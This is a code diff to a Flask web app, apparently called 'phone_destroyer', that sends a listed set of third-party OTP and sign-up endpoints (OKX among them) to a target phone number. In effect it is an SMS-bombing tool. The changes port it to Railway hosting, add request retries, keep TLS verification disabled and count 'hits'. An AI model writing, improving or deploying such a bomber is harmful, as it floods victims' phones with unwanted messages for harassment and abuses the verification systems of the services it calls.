@@ -5,6 +5,12 @@ import json
 import time
 import os
 from threading import Thread
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from urllib3.exceptions import InsecureRequestWarning
+
+# SSL warnings ignore (Railway SSL issues ke liye)
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 app = Flask(__name__)
 app.secret_key = 'phone_destroyer_secret_key_2024'
@@ -195,7 +201,7 @@ ULTIMATE_APIS = [
     {"name": "OKX", "url": "https://www.okx.com/api/v5/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
 ]
 
-# Session storage
+# Session storage (Railway compatible)
 SESSIONS_FILE = '/tmp/sessions.json'
 
 def load_sessions():
@@ -208,21 +214,33 @@ def load_sessions():
     return {}
 
 def save_sessions(sessions):
-    with open(SESSIONS_FILE, 'w') as f:
-        json.dump(sessions, f)
+    try:
+        with open(SESSIONS_FILE, 'w') as f:
+            json.dump(sessions, f)
+    except Exception as e:
+        print(f"Save error: {e}")
 
 def send_request(api, phone):
     try:
         url = api['url'].replace('{phone}', phone)
         headers = api['headers'].copy()
-        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         headers['User-Agent'] = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
+        
+        # Session create karo with retries
+        session = requests.Session()
+        retry_strategy = Retry(
+            total=1,
+            backoff_factor=0.1
+        )
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
         
         if api['method'] == 'POST' and api.get('data'):
             data = api['data'].replace('{phone}', phone)
-            response = requests.post(url, headers=headers, data=data, timeout=3, verify=False)
+            response = session.post(url, headers=headers, data=data, timeout=5, verify=False)
         else:
-            response = requests.get(url, headers=headers, timeout=3, verify=False)
+            response = session.get(url, headers=headers, timeout=5, verify=False)
         
         return response.status_code
     except Exception as e:
@@ -382,5 +400,9 @@ def api_status():
         'totalHits': sum(s.get('hits', 0) for s in sessions.values())
     })
 
-# For Vercel - required
+# For Railway - required
 app.debug = False
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
